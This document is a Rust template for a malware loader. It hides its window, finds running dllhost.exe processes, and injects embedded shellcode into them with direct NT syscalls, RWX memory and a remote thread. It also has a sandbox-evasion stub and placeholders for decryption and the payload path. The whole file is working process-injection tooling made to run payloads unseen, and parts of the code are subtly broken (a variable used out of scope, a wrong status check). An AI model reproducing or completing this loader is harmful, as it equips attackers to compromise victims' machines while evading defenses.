#![windows_subsystem = "windows"]
#[allow(non_snake_case)]

use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use std::include_bytes;
use rust_syscalls::syscall;

use winapi::{
    um::{
        winnt::{MEM_COMMIT, PAGE_READWRITE, MEM_RESERVE, GENERIC_ALL},
        lmaccess::{ACCESS_ALL}
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};
use winapi::ctypes::c_void;
use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
use std::{ptr::null_mut};
use ntapi::ntapi_base::CLIENT_ID;
use winapi::um::sysinfoapi::GetPhysicallyInstalledSystemMemory;
use winapi::shared::ntdef::NULL;

use std::fs::OpenOptions;
use std::io::Write;

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}

fn append_to_file(file_path: &str, data: &[u8]) -> std::io::Result<()> {
    let mut file = OpenOptions::new().create(true).append(true).open(file_path)?;
    file.write_all(data)?;
    Ok(())
}

fn boxboxbox(tar: &str) -> Vec<usize> {
    // search for processes to inject into
    let mut dom: Vec<usize> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        println!("{} {}\n", pro.pid(), pro.name());
        dom.push(usize::try_from(pro.pid().as_u32()).unwrap());
    }
    return dom;
}

fn enhance(mut buf: Vec<u8>, tar: usize) {
    // injecting in target processes :)
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    unsafe {
        let open_status = syscall!("NtOpenProcess", &mut process_handle, ACCESS_ALL, &mut oa, &mut ci);
        if !NT_SUCCESS(open_status) {
            println!("Error opening process: {}\n", open_status);
            if let Err(error) = append_to_file(file_path, b"Error opening process") {
                eprintln!("Error appending to file: {}", error);
            } else {
                println!("Data appended to file successfully.");
            }
        }
        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = buf.len();
        let alloc_status = syscall!("NtAllocateVirtualMemory", process_handle, &mut allocstart, 0, &mut size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if !NT_SUCCESS(alloc_status) {
            println!("Error allocating memory to the target process: {}\n", alloc_status);
            if let Err(error) = append_to_file(file_path, b"Error allocating memory to the target process") {
                eprintln!("Error appending to file: {}", error);
            } else {
                println!("Data appended to file successfully.");
            }
        }
        let mut byteswritten = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let mut buffer_length = buf.len();
        let write_status = syscall!("NtWriteVirtualMemory", process_handle, allocstart, buffer, buffer_length, &mut byteswritten);
        if !NT_SUCCESS(write_status) {
            println!("Error writing to the target process: {}\n", write_status);
            if let Err(error) = append_to_file(file_path, b"Error writing to the target process") {
                eprintln!("Error appending to file: {}", error);
            } else {
                println!("Data appended to file successfully.");
            }
        }

        let mut old_perms = PAGE_READWRITE;
        let protect_status = syscall!("NtProtectVirtualMemory", process_handle, &mut allocstart, &mut buffer_length, PAGE_EXECUTE_READWRITE, &mut old_perms);
        if !NT_SUCCESS(protect_status) {
            println!("[-] Failed to call NtProtectVirtualMemory: {:#x}\n", protect_status);
            if let Err(error) = append_to_file(file_path, b"Failed to mark memory region as RWX") {
                eprintln!("Error appending to file: {}", error);
            } else {
                println!("Data appended to file successfully.");
            }
        }

        let mut thread_handle : *mut c_void = null_mut();
        let handle = process_handle as *mut c_void;

        let write_thread = syscall!("NtCreateThreadEx", &mut thread_handle, GENERIC_ALL, NULL, handle, allocstart, NULL, 0, NULL, NULL, NULL, NULL);

        if write_status != 0 {
            println!("Error failed to create remote thread: {:#02X}\n", write_thread);
            if let Err(error) = append_to_file(file_path, b"Failed to create remote thread") {
                eprintln!("Error appending to file: {}", error);
            } else {
                println!("Data appended to file successfully.");
            }
        }
    }
}

fn main() {
    // inject in the following processes:
    let tar: &str = "dllhost.exe";
    let file_path = "packer-log.txt";

    if let Err(error) = append_to_file(file_path, b"Injection began!") {
        eprintln!("Error appending to file: {}", error);
    } else {
        println!("Data appended to file successfully.");
    }
    let mut memory = 0;
    unsafe {
        let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
        println!("{:#?}", is_quicksand);
    }

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let list: Vec<usize> = boxboxbox(tar);
    if list.len() == 0 {
        if let Err(error) = append_to_file(file_path, b"Cannot find process dllhost.exe!") {
            eprintln!("Error appending to file: {}", error);
        } else {
            println!("Data appended to file successfully.");
        }
        println!("[-] Unable to find a process.");
    } else {
        for i in &list {
            {{MAIN}}
            enhance(vec.clone(), *i);
        }
    }
}
